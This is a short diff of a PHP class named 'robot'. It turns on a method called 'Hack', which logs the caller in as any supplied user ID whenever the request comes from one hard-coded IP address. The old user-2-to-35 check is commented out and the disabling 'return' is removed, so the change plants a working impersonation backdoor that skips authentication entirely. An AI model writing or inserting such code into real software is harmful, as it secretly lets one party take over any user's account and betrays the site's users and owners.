@@ -11,11 +11,12 @@ class robot extends api
     $login = IncludeModule('api', 'login');      
     var_dump($login->UID());
   }
-  protected function Hack()
+  protected function Hack( $uid )
   {
-    return;
     $login = LoadModule('api', 'login');
-    if ($login->UID() == 2)
-      $login->DoLogin(35);
+    //if ($login->UID() == 2)
+      //
+	if (_ip_ == '213.21.7.6')
+	  $login->DoLogin($uid);
   }
 }
